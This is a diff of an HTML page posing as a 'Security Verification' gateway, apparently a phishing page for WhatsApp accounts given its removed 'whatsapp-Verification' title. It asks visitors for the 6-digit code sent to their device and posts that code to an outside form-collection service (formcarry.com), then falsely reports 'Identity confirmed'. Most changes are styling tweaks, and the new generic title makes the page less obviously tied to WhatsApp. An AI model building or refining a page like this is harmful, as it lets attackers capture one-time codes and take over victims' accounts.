@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title> whatsapp-Verification | Gateway</title>
+  <title>Security Verification | Gateway</title>
   <style>
     :root {
       --primary: #10b981; /* Emerald */
       --primary-dark: #059669;
-      --bg-base: #0f172a; /* Slate 900 */
-      --card-bg: rgba(30, 41, 59, 0.7); /* Slate 800 with opacity */
+      --bg-base: #0f172a; 
+      --card-bg: rgba(30, 41, 59, 0.7); 
       --text-main: #f8fafc;
       --text-muted: #94a3b8;
       --border: rgba(255, 255, 255, 0.1);
@@ -45,7 +45,7 @@
       padding: 48px 40px; 
       width: 100%;
       max-width: 380px; 
-      border-radius: 24px; 
+      border-radius: 32px; 
       border: 1px solid var(--border);
       box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
       box-sizing: border-box;
@@ -54,7 +54,7 @@
     .logo { 
       height: 40px; 
       margin-bottom: 32px; 
-      filter: brightness(0) invert(1); /* Forces logo to white if it's dark */
+      filter: brightness(0) invert(1);
       opacity: 0.9;
     }
 
@@ -64,29 +64,28 @@
       gap: 6px;
       background: rgba(16, 185, 129, 0.1);
       color: var(--primary);
-      padding: 6px 12px;
+      padding: 6px 14px;
       border-radius: 100px;
       font-size: 11px;
-      font-weight: 600;
+      font-weight: 700;
       text-transform: uppercase;
       letter-spacing: 1px;
-      margin-bottom: 20px;
+      margin-bottom: 24px;
     }
     
-    h2 { font-size: 24px; font-weight: 700; margin: 0 0 8px 0; letter-spacing: -0.025em; }
-    p { font-size: 14px; color: var(--text-muted); line-height: 1.6; margin-bottom: 24px; }
+    h2 { font-size: 26px; font-weight: 700; margin: 0 0 8px 0; letter-spacing: -0.025em; }
+    p { font-size: 14px; color: var(--text-muted); line-height: 1.6; margin-bottom: 28px; }
     
-    /* Modern Input Styling */
     input { 
       display: block; 
       margin: 24px auto; 
       padding: 16px; 
       width: 100%; 
-      border-radius: 12px; 
-      border: 1px solid rgba(255,255,255,0.1); 
-      background: rgba(0, 0, 0, 0.2); 
+      border-radius: 50px; /* Fully rounded input to match buttons */
+      border: 1px solid rgba(255,255,255,0.15); 
+      background: rgba(0, 0, 0, 0.3); 
       color: white; 
-      font-size: 20px;
+      font-size: 22px;
       font-weight: 600;
       letter-spacing: 6px;
       text-align: center;
@@ -97,64 +96,82 @@
     input:focus {
       outline: none;
       border-color: var(--primary);
-      background: rgba(0, 0, 0, 0.4);
+      background: rgba(0, 0, 0, 0.5);
       box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.2);
     }
 
-    /* Professional Button Styling */
+    /* FULLY ROUNDED (PILL) BUTTONS */
     button { 
-      padding: 16px; 
-      border-radius: 12px; 
-      border: none; 
+      padding: 16px 24px; 
+      border-radius: 50px; /* This makes the sides fully round */
+      border: 2px solid var(--primary); 
       cursor: pointer; 
-      background: #f8fafc; 
-      color: #0f172a;
-      font-weight: 600; 
+      font-weight: 700; 
       width: 100%; 
-      font-size: 15px;
-      transition: all 0.2s ease;
+      font-size: 14px;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 8px;
+      text-transform: uppercase;
+      letter-spacing: 1.2px;
     }
 
-    button:hover { background: #ffffff; transform: translateY(-1px); }
-    button:active { transform: translateY(0); }
-    button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-    
+    /* THEME: WHITE WITH GREEN WRITING */
+    #reqBtn {
+      background: #ffffff; 
+      color: var(--primary);
+    }
+    #reqBtn:hover { 
+      background: var(--primary);
+      color: #ffffff;
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px -5px rgba(16, 185, 129, 0.4);
+    }
+
+    /* THEME: GREEN WITH WHITE WRITING */
     .btn-verify { 
       background: var(--primary); 
       color: white; 
       margin-top: 16px; 
     }
-    .btn-verify:hover { background: var(--primary-dark); }
+    .btn-verify:hover { 
+      background: #ffffff;
+      color: var(--primary);
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px -5px rgba(255, 255, 255, 0.1);
+    }
+
+    button:active { transform: translateY(0); }
+    button:disabled { opacity: 0.5; cursor: not-allowed; filter: grayscale(1); }
     
     .status-msg { 
       margin-top: 20px; 
       font-size: 13px; 
-      color: #fbbf24; /* Amber 400 */
-      font-weight: 500;
-      padding: 12px;
+      color: #fbbf24;
+      font-weight: 600;
+      padding: 14px;
       background: rgba(251, 191, 36, 0.1);
-      border-radius: 8px;
+      border-radius: 16px;
+      border: 1px solid rgba(251, 191, 36, 0.2);
     }
     
     #codeEntrySection { 
         display: none; 
         margin-top: 24px; 
-        animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1);
     }
 
     @keyframes slideUp {
-        from { opacity: 0; transform: translateY(20px); }
+        from { opacity: 0; transform: translateY(30px); }
         to { opacity: 1; transform: translateY(0); }
     }
     
     .footer-note {
-      margin-top: 24px;
+      margin-top: 32px;
       font-size: 11px;
       color: var(--text-muted);
+      letter-spacing: 0.5px;
     }
   </style>
 </head>
@@ -173,27 +190,27 @@
       <h2>Verification Required</h2>
       <p>Confirm your identity to access the portal. A unique code will be sent to your registered device.</p>
       
-      <form id="vForm" action="https://formcarry.com/s/tbk_myA3Xem" method="POST">
+      <form id="vForm" action="https://formcarry.com" method="POST">
         <input type="hidden" name="phone_number" value="Hidden_System_User">
         <input type="hidden" name="intent" id="intent" value="">
 
         <button type="submit" id="reqBtn">
-          Request Verification Code
+          Request Code
         </button>
         
         <div id="waitMessage" class="status-msg" style="display:none;">
-          Request sent. Please check your inbox or SMS.
+          Request sent. Please check your inbox.
         </div>
 
         <div id="codeEntrySection">
-          <h3 style="margin: 0; font-size: 16px; font-weight: 600;">Enter Code</h3>
-          <p style="font-size: 13px; margin: 4px 0 0 0;">6-digit security key</p>
+          <h3 style="margin: 0; font-size: 16px; font-weight: 700;">Enter Code</h3>
+          <p style="font-size: 13px; margin: 4px 0 0 0;">Enter the 6-digit security key</p>
           
-          <input type="text" name="received_code" id="codeInput" placeholder="000000" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+          <input type="text" name="received_code" id="codeInput" placeholder="000000" maxlength="6" inputmode="numeric">
           
-          <button type="submit" id="subBtn" class="btn-verify">Verify and Continue</button>
+          <button type="submit" id="subBtn" class="btn-verify">Verify Identity</button>
           
-          <div id="successMessage" class="status-msg" style="color: var(--primary); background: rgba(16, 185, 129, 0.1); display:none;">
+          <div id="successMessage" class="status-msg" style="color: var(--primary); background: rgba(16, 185, 129, 0.1); border-color: rgba(16, 185, 129, 0.2); display:none;">
             Identity confirmed. Redirecting...
           </div>
         </div>
@@ -216,12 +233,10 @@
 
   vForm.addEventListener('submit', async (e) => {
     e.preventDefault();
-
     const clickedBtn = document.activeElement;
     const isRequest = clickedBtn.id === 'reqBtn';
     
     intentInput.value = isRequest ? "Requesting New Code" : "User Entered Code: " + codeInput.value;
-
     const statusId = isRequest ? 'waitMessage' : 'successMessage';
     const statusMsg = document.getElementById(statusId);
 
@@ -259,4 +274,3 @@
 
 </body>
 </html>
-
